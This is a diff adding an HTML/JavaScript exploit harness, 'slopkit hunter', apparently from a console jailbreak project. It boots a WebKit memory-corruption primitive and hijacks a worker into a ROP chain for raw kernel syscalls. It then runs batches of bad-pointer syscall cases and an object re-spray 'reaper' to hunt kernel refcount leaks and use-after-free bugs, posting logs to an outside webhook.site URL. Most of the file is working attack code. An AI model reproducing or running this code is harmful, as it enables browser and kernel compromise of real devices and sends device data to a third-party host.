@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>slopkit hunter</title>
+
+<script>(function () {
+    // Early capture, before any exploit script runs. Alerts are intercepted
+    // because main.js/rop.js use alert() for fatal diagnostics.
+    var pending = [];
+    window.__huntEarly = pending;
+    function raw(tag, text) {
+        var line = tag + " " + String(text).replace(/[^A-Za-z0-9_.:=,+-]/g, "_").slice(0, 200);
+        pending.push(line);
+        try {
+            var d = document.getElementById("log");
+            if (d) d.textContent += line + "\n";
+        } catch (e) { }
+    }
+    window.__huntRaw = raw;
+    window.alert = function (m) { raw("ALERT-INTERCEPTED", m); };
+    window.confirm = function (m) { raw("CONFIRM-INTERCEPTED", m); return false; };
+    window.addEventListener("error", function (e) {
+        raw("WINDOW-ERROR", (e && e.message) + "@" + (e && e.filename)
+            + ":" + (e && e.lineno));
+    });
+    window.addEventListener("unhandledrejection", function (e) {
+        raw("UNHANDLED-REJECTION",
+            e && e.reason && (e.reason.message || e.reason));
+    });
+})();
+</script>
+
+<style>
+  html, body { margin: 0; padding: 0; min-height:100%;
+    background: radial-gradient(circle at 50% 28%, #1a1526 0, #0d0b14 44%, #07070b 100%);
+    color: #d8dee9; }
+  body { box-sizing:border-box; min-height:100vh;
+    font: 22px/1.35 "Consolas", "DejaVu Sans Mono", monospace;
+    padding: 24px 20px; display:flex; flex-direction:column;
+    align-items:center; }
+  h1 { font-size: 30px; margin: 0 0 2px; color: #eceff4; font-weight: 600; }
+  .sub { font-size: 18px; color: #7c8795; margin: 0 0 12px; }
+  #stage { font-size: 26px; padding: 10px 14px; border-radius: 6px;
+           margin-bottom: 12px; background: #1b2430; border-left: 8px solid #b48ead;
+           white-space: pre-wrap; max-width: 1100px; }
+  #stage.ok  { background: #16281c; border-left-color: #47c76a; color: #b8f0c6; }
+  #stage.bad { background: #4a0d10; border-left-color: #ff5566; color: #ffe3e6; }
+  #log { box-sizing: border-box; width: 92vw; max-width: 1100px; height: 60vh;
+         overflow: auto; font-size: 15px; line-height: 1.3; color: #b8c4d2;
+         background: rgba(12,14,22,.9); border: 1px solid #3a3248;
+         border-radius: 12px; padding: 13px 15px; margin: 0; white-space: pre-wrap; }
+  #startBtn { display: inline-block; margin: 0 0 14px; padding: 16px 28px;
+              background: #2a2140; border: 3px solid #b48ead; border-radius: 8px;
+              color: #e5d8f4; text-decoration: none; font-size: 28px; font-weight: 700; }
+  #startBtn:focus { outline: 3px solid #ebcb8b; }
+</style>
+</head>
+<body>
+  <h1>slopkit hunter</h1>
+  <p class="sub">kernel refcount-leak hunter — badptr stress + re-spray reaper</p>
+  <div id="stage">boot</div>
+  <a tabindex="0" id="startBtn" href="#">START HUNT</a>
+  <pre id="log"></pre>
+
+<script src="rop.js?v=final"></script>
+<script src="main.js?v=final"></script>
+<script>window.offsetsReady = new Promise(function (res, rej) {
+    var s = document.querySelector('script[src^="../offsets/"]');
+    if (!s) return rej(new Error("offsets script was never injected by main.js"));
+    if (typeof OFFSET_wk_vtable_first_element !== "undefined") return res(s.src);
+    s.addEventListener("load", function () { res(s.src); });
+    s.addEventListener("error", function () {
+        rej(new Error("offsets 404: " + s.src));
+    });
+});
+</script>
+<script src="syscalls.js"></script>
+
+<script type="module">
+import { establishPrimitive, fakeCellReleased } from "./core.js?v=final";
+import { installWindowP, pairStatus } from "./mem.js?v=final";
+import { int64 } from "./int64.js";
+
+// ---------------------------------------------------------------- config
+const Q = new URLSearchParams(location.search);
+const AUTO = Q.get("auto") === "1";
+const N_ITER = Math.max(1, parseInt(Q.get("n") || "2000", 10) || 2000);
+const ONLY = (Q.get("only") || "").split(",").map(s => s.trim()).filter(Boolean);
+const BATCH = Math.max(16, Math.min(1024, parseInt(Q.get("batch") || "256", 10) || 256));
+const MAX_ATTEMPTS = parseInt(Q.get("attempts") || Q.get("max") || "8", 10) || 8;
+const REV = "slopkit-hunter-1";
+
+// ---------------------------------------------------------------- screen log
+const logEl = document.getElementById("log");
+const stageEl = document.getElementById("stage");
+const startBtn = document.getElementById("startBtn");
+let screenLines = 0;
+
+function screen(line) {
+    try {
+        logEl.textContent += line + "\n";
+        if (++screenLines > 400) {
+            const t = logEl.textContent;
+            logEl.textContent = t.slice(t.indexOf("\n", t.length - 60000) + 1);
+            screenLines = 300;
+        }
+        logEl.scrollTop = logEl.scrollHeight;
+    } catch (e) { }
+}
+
+function stage(text, cls) {
+    try {
+        stageEl.textContent = String(text);
+        stageEl.className = cls || "";
+    } catch (e) { }
+}
+
+// ---------------------------------------------------------------- remote log
+// Minimal port of poops.html:789-856: buffer events, POST every ~2s, beacon
+// on pagehide. The Mac server prints them; if the console panics mid-hunt,
+// the last flushed event is the crash site.
+const REMOTE_LOG_URL = "https://webhook.site/c841a5f1-897c-4d46-9f46-4e837a8864ec";
+const REMOTE_T0 = Date.now();
+const REMOTE_SESSION = REMOTE_T0.toString(36) + "-"
+    + Math.floor(Math.random() * 0x100000000).toString(36);
+const remoteEvents = [];
+
+function logEvent(tag, extra) {
+    remoteEvents.push({
+        ms: Date.now() - REMOTE_T0,
+        tag: String(tag).slice(0, 64),
+        extra: extra == null ? "" : String(extra).slice(0, 1024)
+    });
+    if (remoteEvents.length > 256) remoteEvents.shift();
+    screen(extra == null || extra === "" ? String(tag) : String(tag) + " " + extra);
+}
+
+function flushRemote(unloading) {
+    if (!remoteEvents.length) return Promise.resolve();
+    const events = remoteEvents.splice(0, remoteEvents.length);
+    const body = JSON.stringify({
+        v: 1,
+        session: REMOTE_SESSION,
+        rev: REV,
+        fw: typeof window.fw_str === "string" ? window.fw_str : "",
+        page: location.pathname + location.search,
+        events: events
+    });
+    if (unloading && typeof navigator.sendBeacon === "function") {
+        try { if (navigator.sendBeacon(REMOTE_LOG_URL, body)) return Promise.resolve(); } catch (e) { }
+    }
+    try {
+        return fetch(REMOTE_LOG_URL, {
+            method: "POST",
+            headers: { "Content-Type": "text/plain;charset=UTF-8" },
+            body: body,
+            cache: "no-store"
+        }).then(function () { }, function () { });
+    } catch (e) { return Promise.resolve(); }
+}
+
+setInterval(function () { flushRemote(false); }, 2000);
+window.addEventListener("pagehide", function () { flushRemote(true); });
+window.addEventListener("beforeunload", function () { flushRemote(true); });
+
+// Replay anything the early classic-script capture saw.
+try {
+    if (Array.isArray(window.__huntEarly))
+        for (const line of window.__huntEarly) logEvent("EARLY", line);
+} catch (e) { }
+
+// ---------------------------------------------------------------- helpers
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+const yield0 = () => new Promise(r => setTimeout(r, 0));
+const mkI64 = (lo, hi) => new int64(lo, hi);
+// The P2JB trigger pattern: a non-NULL name pointer whose copyinstr fails
+// (poops.js POC_ARG_LO/POC_ARG_HI -> rdi=0x800000000000).
+const BADPTR = mkI64(0x0, 0x8000);
+
+let P = null;      // prepared userland primitive bundle (from main.js prepare)
+let chain = null;  // worker_rop chain
+
+function hasStub(num) {
+    try {
+        return !!(chain && chain.syscalls
+            && chain.syscalls[num] !== undefined);
+    } catch (e) { return false; }
+}
+
+// Batched-call style modelled on poops.js emitCall (poops.js:1754-1772):
+// many chain.fcall + chain.write_result4 into one ROP chain, a single
+// chain.run(), then read the 32-bit results straight out of the backing
+// Uint32Array of a p.malloc'd buffer.
+const RETS_CAP = 4096;
+let retsPtr = null;
+
+function ensureRets() {
+    if (retsPtr === null) {
+        if (!P || typeof P.malloc !== "function")
+            throw new Error("P.malloc unavailable, cannot build result arena");
+        retsPtr = P.malloc(RETS_CAP); // type 4 -> Uint32Array backing
+    }
+}
+
+async function runOps(ops) {
+    // ops: [{ num, args:[a1..a6] }], length must be <= RETS_CAP
+    if (!ops.length) return [];
+    if (ops.length > RETS_CAP)
+        throw new Error("runOps: " + ops.length + " ops > RETS_CAP " + RETS_CAP);
+    ensureRets();
+    for (let i = 0; i < ops.length; i++) {
+        const a = ops[i].args || [];
+        chain.fcall(chain.syscalls[ops[i].num],
+            a[0], a[1], a[2], a[3], a[4], a[5]);
+        chain.write_result4(retsPtr.add32(i * 4));
+    }
+    await chain.run();
+    const out = new Array(ops.length);
+    for (let i = 0; i < ops.length; i++) out[i] = retsPtr.backing[i] | 0;
+    return out;
+}
+
+function histTop(hist, limit) {
+    const entries = [...hist.entries()].sort((a, b) => b[1] - a[1]);
+    return entries.slice(0, limit)
+        .map(([r, c]) => r + "x" + c).join(" ");
+}
+
+// ---------------------------------------------------------------- reaper
+// Free + re-spray phase: churn kernel objects of the relevant class so a
+// leaked refcount / freed object gets reused. If a UAF fires, the console
+// panics here and the Mac log shows the last REAPER line.
+async function reaper(name, extraChurns) {
+    const churns = [
+        { label: "kqueue", num: SYS_KQUEUE, args: [] },
+        { label: "socket6", num: SYS_SOCKET, args: [28, 2, 0] } // AF_INET6, SOCK_DGRAM
+    ].concat(extraChurns || []);
+    for (const c of churns) {
+        if (!hasStub(c.num)) { logEvent("REAPER-SKIP", name + " " + c.label + " no-stub"); continue; }
+        for (let r = 0; r < 3; r++) {
+            logEvent("REAPER", name + " " + c.label + " round=" + r);
+            const ops = [];
+            for (let k = 0; k < 256; k++) ops.push({ num: c.num, args: c.args });
+            let out;
+            try { out = await runOps(ops); }
+            catch (e) {
+                logEvent("REAPER-ERR", name + " " + c.label + " " + (e && e.message || e));
+                break;
+            }
+            if (hasStub(SYS_CLOSE)) {
+                const closes = [];
+                for (const fd of out)
+                    if (fd >= 0) closes.push({ num: SYS_CLOSE, args: [fd] });
+                for (let off = 0; off < closes.length; off += BATCH) {
+                    try { await runOps(closes.slice(off, off + BATCH)); }
+                    catch (e) { logEvent("REAPER-CLOSE-ERR", name + " " + (e && e.message || e)); break; }
+                }
+            }
+            await yield0();
+            flushRemote(false);
+        }
+    }
+}
+
+// ---------------------------------------------------------------- test cases
+// Each loop case returns the ops of ONE iteration from perIter(i). Ops whose
+// ret >= 0 are unexpected: they are logged as ANOMALY and closed via
+// closeWith (so a patched-but-leaky path does not exhaust the fd table).
+const BATTERY = [
+    {
+        name: "kqueueex-badname",
+        needs: [SYS_KQUEUEEX],
+        // Patched in 13.00 -- control case. expect -1 every time.
+        perIter: () => [{ num: SYS_KQUEUEEX, args: [BADPTR, 0], closeWith: SYS_CLOSE }]
+    },
+    {
+        name: "kqueueex-badname-variations",
+        needs: [SYS_KQUEUEEX],
+        perIter: () => [
+            { num: SYS_KQUEUEEX, args: [BADPTR, 0x0], closeWith: SYS_CLOSE },
+            { num: SYS_KQUEUEEX, args: [BADPTR, 0x1], closeWith: SYS_CLOSE },
+            { num: SYS_KQUEUEEX, args: [BADPTR, 0x800], closeWith: SYS_CLOSE },
+            { num: SYS_KQUEUEEX, args: [BADPTR, 0x10000], closeWith: SYS_CLOSE },
+            { num: SYS_KQUEUEEX, args: [BADPTR, 0xFFFFFFFF], closeWith: SYS_CLOSE }
+        ]
+    },
+    {
+        name: "evf-open-badname",
+        needs: [SYS_EVF_OPEN],
+        perIter: () => [{ num: SYS_EVF_OPEN, args: [BADPTR], closeWith: SYS_EVF_CLOSE }]
+    },
+    {
+        name: "evf-create-badname",
+        needs: [SYS_EVF_CREATE],
+        perIter: () => [{ num: SYS_EVF_CREATE, args: [BADPTR, 0, 0], closeWith: SYS_EVF_CLOSE }]
+    },
+    {
+        name: "ksem-open-badname",
+        needs: [SYS_KSEM_OPEN],
+        // ksem_open(0, name, oflag, mode, value) -- name is the failing copyinstr.
+        perIter: () => [{ num: SYS_KSEM_OPEN, args: [0, BADPTR, 0, 0, 0], closeWith: SYS_KSEM_CLOSE }]
+    },
+    {
+        name: "shm-open-badname",
+        needs: [SYS_SHM_OPEN],
+        perIter: () => [{ num: SYS_SHM_OPEN, args: [BADPTR, 0, 0], closeWith: SYS_CLOSE }]
+    },
+    {
+        name: "openat-badpath",
+        needs: [SYS_OPENAT],
+        // openat(AT_FDCWD, badpath, O_RDONLY, 0) -- VFS namei copyinstr path.
+        perIter: () => [{ num: SYS_OPENAT, args: [0xFFFFFF9C, BADPTR, 0, 0], closeWith: SYS_CLOSE }]
+    },
+    {
+        name: "namedobj-create-badname",
+        needs: [SYS_NAMEDOBJ_CREATE],
+        perIter: () => [{ num: SYS_NAMEDOBJ_CREATE, args: [BADPTR, 0, 0] }]
+    },
+    {
+        name: "socket-setsockopt-stress",
+        needs: [SYS_SOCKET, SYS_SETSOCKOPT, SYS_CLOSE],
+        custom: runSocketStress
+    }
+];
+
+async function runLoopCase(tc, totalIters) {
+    const hist = new Map();
+    let successes = 0, anomalyLogged = 0, i = 0;
+    while (i < totalIters) {
+        const group = Math.min(100, totalIters - i); // progress/yield every 100 iters
+        const ops = [];
+        for (let k = 0; k < group; k++) {
+            const per = tc.perIter(i + k);
+            for (const op of per) ops.push(op);
+        }
+        for (let off = 0; off < ops.length; off += BATCH) {
+            const slice = ops.slice(off, off + BATCH);
+            let out;
+            try { out = await runOps(slice); }
+            catch (e) {
+                logEvent("HUNT-CHAIN-ERR", tc.name + " i=" + (i + off) + " "
+                    + (e && e.message || e));
+                throw e;
+            }
+            const closes = [];
+            for (let j = 0; j < out.length; j++) {
+                const r = out[j] | 0;
+                hist.set(r, (hist.get(r) || 0) + 1);
+                if (r >= 0) {
+                    successes++;
+                    const cw = slice[j].closeWith;
+                    if (cw !== undefined && hasStub(cw))
+                        closes.push({ num: cw, args: [r] });
+                    if (anomalyLogged < 8) {
+                        anomalyLogged++;
+                        logEvent("ANOMALY", tc.name + " ret=" + r
+                            + " sys=0x" + slice[j].num.toString(16) + " i=" + (i + j));
+                    }
+                }
+            }
+            for (let off2 = 0; off2 < closes.length; off2 += BATCH) {
+                try { await runOps(closes.slice(off2, off2 + BATCH)); }
+                catch (e) { logEvent("HUNT-CLOSE-ERR", tc.name + " " + (e && e.message || e)); break; }
+            }
+        }
+        i += group;
+        logEvent("HUNT", tc.name + " i=" + i);
+        await yield0();
+        flushRemote(false);
+        if (successes > 128) {
+            logEvent("HUNT-ABORT", tc.name + " too-many-successes=" + successes
+                + " (fd-table protection)");
+            break;
+        }
+    }
+    logEvent("HUNT-STATS", tc.name + " iters=" + i + " rets: " + histTop(hist, 6));
+    await reaper(tc.name, tc.reaperChurns);
+}
+
+// socket-setsockopt-stress: pool of AF_INET6 sockets, malformed
+// setsockopt/getsockopt IPV6 options (failing copyin via badptr), then close.
+async function runSocketStress(tc, totalIters) {
+    const POOL = 64;
+    const optnames = [51, 46, 50, 48]; // IPV6_RTHDR, IPV6_PKTOPTIONS, IPV6_DSTOPTS, IPV6_NEXTHOP
+    const hist = new Map();
+    let anomalyLogged = 0;
+
+    logEvent("HUNT-SETUP", tc.name + " creating pool=" + POOL);
+    const mk = [];
+    for (let k = 0; k < POOL; k++) mk.push({ num: SYS_SOCKET, args: [28, 2, 0] });
+    const fds = (await runOps(mk)).filter(fd => fd >= 0);
+    if (!fds.length) {
+        logEvent("SKIP", tc.name + " no-sockets (socket() failed)");
+        return;
+    }
+    logEvent("HUNT-SETUP", tc.name + " pool=" + fds.length + "/" + POOL);
+
+    let optlenPtr = null;
+    if (hasStub(SYS_GETSOCKOPT)) {
+        try {
+            optlenPtr = P.malloc(0x10);
+            P.write4(optlenPtr, 0x100);
+        } catch (e) { optlenPtr = null; }
+    }
+
+    let i = 0;
+    try {
+        while (i < totalIters) {
+            const group = Math.min(100, totalIters - i);
+            const ops = [];
+            for (let k = 0; k < group; k++) {
+                const fd = fds[(i + k) % fds.length];
+                const on = optnames[(i + k) % optnames.length];
+                ops.push({ num: SYS_SETSOCKOPT, args: [fd, 41, on, BADPTR, 0x100] }); // IPPROTO_IPV6
+                if (optlenPtr !== null && (k & 1) === 0)
+                    ops.push({ num: SYS_GETSOCKOPT, args: [fd, 41, on, BADPTR, optlenPtr] });
+            }
+            for (let off = 0; off < ops.length; off += BATCH) {
+                const slice = ops.slice(off, off + BATCH);
+                let out;
+                try { out = await runOps(slice); }
+                catch (e) {
+                    logEvent("HUNT-CHAIN-ERR", tc.name + " i=" + (i + off) + " "
+                        + (e && e.message || e));
+                    throw e;
+                }
+                for (let j = 0; j < out.length; j++) {
+                    const r = out[j] | 0;
+                    hist.set(r, (hist.get(r) || 0) + 1);
+                    if (r >= 0 && slice[j].num === SYS_SETSOCKOPT && anomalyLogged < 8) {
+                        anomalyLogged++;
+                        logEvent("ANOMALY", tc.name + " setsockopt ret=" + r + " i=" + (i + j));
+                    }
+                }
+            }
+            i += group;
+            logEvent("HUNT", tc.name + " i=" + i);
+            await yield0();
+            flushRemote(false);
+        }
+    } finally {
+        logEvent("HUNT-STATS", tc.name + " iters=" + i + " rets: " + histTop(hist, 6));
+        const closes = fds.map(fd => ({ num: SYS_CLOSE, args: [fd] }));
+        for (let off = 0; off < closes.length; off += BATCH) {
+            try { await runOps(closes.slice(off, off + BATCH)); } catch (e) { break; }
+        }
+        await reaper(tc.name);
+    }
+}
+
+// ---------------------------------------------------------------- boot
+// Initialization mirrors poops.html bootPrimitiveAndChain() (lines 2213-2320)
+// and its script wiring (lines 407-423): rop.js + main.js (which injects
+// ../offsets/<fw>.js), offsetsReady barrier, syscalls.js, then this module.
+async function boot() {
+    stage("waiting for offsets");
+    await window.offsetsReady;
+    logEvent("OFFSETS-READY", "fw=" + window.fw_str);
+
+    if (!(globalThis.p && typeof globalThis.p.read8 === "function")) {
+        stage("running the webkit bug -- placement is ~1 attempt in 3, it retries itself");
+        try { history.replaceState(null, ""); } catch (e) { }
+        if (typeof globalThis.gc === "function") { try { globalThis.gc(); } catch (e) { } }
+        await sleep(750);
+
+        const carrier = await establishPrimitive({
+            maxAttempts: MAX_ATTEMPTS,
+            onEvent(tag, detail, attempt) {
+                if (tag === "ATTEMPT-START") {
+                    logEvent(tag, detail);
+                    stage("exploit attempt " + attempt + " -- waiting for placement");
+                    flushRemote(false);
+                } else {
+                    logEvent("CORE-" + tag, detail);
+                }
+            }
+        });
+        installWindowP(carrier, { onEvent: (t, d) => logEvent("MEM-" + t, d) });
+        if (typeof globalThis.gc === "function") { try { globalThis.gc(); } catch (e) { } }
+        await sleep(1000);
+        logEvent("PRIMITIVE-UP", "attempt=" + carrier.attempts
+            + "-paired=" + pairStatus.promoted + "-released=" + fakeCellReleased());
+        if (!pairStatus.promoted)
+            throw new Error("the (main, worker) pair was NOT promoted ("
+                + pairStatus.error + ")");
+    } else {
+        logEvent("PRIMITIVE-REUSED", "window.p was already published");
+    }
+
+    const p = globalThis.p;
+    if (!p || typeof p.read8 !== "function")
+        throw new Error("window.p was never published");
+
+    stage("prepare(): module bases, gadget/syscall tables, worker hijack");
+    const handoff = window.jbPrepared || null;
+    let prepared;
+    if (handoff && handoff.chain && handoff.p
+        && typeof handoff.chain.syscall === "function"
+        && handoff.p.syscalls !== undefined) {
+        prepared = handoff;
+        logEvent("CHAIN-REUSED", "window.jbPrepared");
+    } else {
+        prepared = await prepare(p);
+        logEvent("PREP-OK", "getpid-passed-inside-prepare");
+    }
+    P = prepared.p;
+    chain = prepared.chain;
+}
+
+async function main() {
+    try { startBtn.style.display = "none"; } catch (e) { }
+    try {
+        await boot();
+    } catch (e) {
+        const msg = (e && e.message) ? e.message : String(e);
+        stage("HUNTER-FAIL -- " + msg, "bad");
+        logEvent("HUNTER-FAIL", msg);
+        flushRemote(false);
+        return;
+    }
+
+    let pidTxt = "unknown";
+    try {
+        const pid = await chain.syscall(SYS_GETPID);
+        pidTxt = String(pid.low);
+    } catch (e) {
+        logEvent("HUNTER-GETPID-ERR", (e && e.message) || String(e));
+    }
+    stage("HUNTER-READY pid=" + pidTxt, "ok");
+    logEvent("HUNTER-READY", "pid=" + pidTxt + " fw=" + window.fw_str
+        + " n=" + N_ITER + " batch=" + BATCH
+        + " only=" + (ONLY.join(".") || "all"));
+    flushRemote(false);
+
+    for (const tc of BATTERY) {
+        if (ONLY.length && ONLY.indexOf(tc.name) < 0) {
+            logEvent("SKIP", tc.name + " filtered");
+            continue;
+        }
+        let missing = null;
+        try {
+            for (const num of tc.needs) if (!hasStub(num)) { missing = num; break; }
+        } catch (e) { missing = "?"; }
+        if (missing !== null) {
+            logEvent("SKIP", tc.name + " no-stub"
+                + (missing === "?" ? "" : " sys=0x" + missing.toString(16)));
+            continue;
+        }
+        logEvent("HUNT-START", tc.name + " n=" + N_ITER);
+        stage("hunting: " + tc.name);
+        try {
+            if (typeof tc.custom === "function")
+                await tc.custom(tc, N_ITER);
+            else
+                await runLoopCase(tc, N_ITER);
+            logEvent("HUNT-DONE", tc.name);
+        } catch (e) {
+            const msg = (e && e.message) ? e.message : String(e);
+            logEvent("HUNT-ERROR", tc.name + " " + msg);
+            // A JS-side error is not necessarily fatal for the chain; keep
+            // going with the next case after a settle.
+            await sleep(500);
+        }
+        flushRemote(false);
+    }
+
+    stage("hunt complete -- see Mac terminal log", "ok");
+    logEvent("HUNTER-ALL-DONE", "session=" + REMOTE_SESSION);
+    flushRemote(false);
+}
+
+startBtn.addEventListener("click", function () { main(); });
+if (AUTO) {
+    main();
+} else {
+    stage("ready -- press START HUNT (or add ?auto=1)");
+    try { startBtn.focus(); } catch (e) { }
+}
+</script>
+</body>
+</html>
